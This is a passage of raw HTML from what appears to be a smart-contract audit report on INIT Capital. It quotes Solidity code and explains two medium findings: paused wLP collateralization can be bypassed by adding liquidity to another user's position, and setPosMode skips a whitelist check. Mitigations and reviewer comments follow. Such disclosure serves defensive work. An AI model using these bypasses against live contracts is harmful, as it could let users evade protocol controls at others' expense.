class=\"mtk12\">TOKEN_NOT_WHITELISTED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check if the position mode supports _wLp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">).</span><span class=\"mtk11\">lp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update collateral on the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtColl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addCollateralWLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CollateralizeWLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_wLp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtColl</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>However, when calculating collateral credit, it will calculate based on balance of LP of specific token inside wLP contract.</p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L456\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L456</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getCollateralCreditCurrent_e36</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collCredit_e36</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get position collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amts</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPosCollInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate collateralCredit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collCredit_e54</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">underlyingToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenPrice_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IInitOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getPrice_e36</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenValue_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">toAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]) * </span><span class=\"mtk12\">tokenPrice_e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">TokenFactors</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factors</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTokenFactors</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">collCredit_e54</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">tokenValue_e36</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">factors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collFactor_e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">j</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLpPrice_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">calculatePrice_e36</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLpValue_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">] * </span><span class=\"mtk12\">wLpPrice_e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">TokenFactors</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factors</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTokenFactors</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">lp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">collCredit_e54</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">wLpValue_e36</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">factors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collFactor_e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">collCredit_e36</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collCredit_e54</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">ONE_E18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L125\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L125</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPosCollInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wLpAmts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PosCollInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">__posCollInfos</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pools</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collTokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">values</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amts</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">pools</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collAmts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">pools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk11\">values</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ids</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[][](</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">wLpAmts</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[][](</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">posCollInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]].</span><span class=\"mtk11\">values</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">wLpAmts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">j</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uinc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;             </span><span class=\"mtk12\">wLpAmts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">IBaseWrapLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wLps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOfLp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">][</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>It should be noted that most DEXs (e.g., Uniswap) allow any user to provide liquidity to any other users position. In practice, this bypasses the collateralization paused functionality.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement internal accounting for wLP inside the <code>PosManager</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/25#issuecomment-1870315217\">fez-init (INIT) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Internal accounting shall be ensured in wLp.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/25#issuecomment-1871323396\">hansfriese (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Medium is appropriate as the admin’s action can be bypassed.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-setposmode-function-doesnt-check-if-wlp-is-whitelisted\" style=\"position:relative;\"><a href=\"#m-06-setposmode-function-doesnt-check-if-wlp-is-whitelisted\" aria-label=\"m 06 setposmode function doesnt check if wlp is whitelisted permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/22\">[M-06] setPosMode function doesn’t check if wLp is whitelisted</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/22\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/32\">sashik_eth</a></em></p>\n<p>Using <code>setPosMode</code> function owner of position can change it’s mode. When the function is called, then there are a lot of checks, like if current mode allows to decollateralize and if new mode allows to collateralize.</p>\n<p>Also it’s checked, that all position collateral is used by the new mode. It’s done <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L189\">for the pools</a> and <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L193\">for the wLp tokens</a>.</p>\n<p>In order to be able to use wLp tokens as collateral, then wLp should be whitelisted. It is checked in several places in the code, <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255\">like here</a>. It’s also possible that after some time wLp token will be blacklisted. In this case it should not be allowed to migrate blacklisted wLp token to the new mode, however there is no such check in the setPosMode function.</p>\n<p>As result user can provide blacklisted collateral to the new mode.\nI understand that borrowing factor for such collateral will be likely about 0, however if you would try to collateralize such token, then <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L255\">it will be denied</a>, thus setMode function breaks this invariant.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Non whitelisted collateral can be moved to the new mode.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" 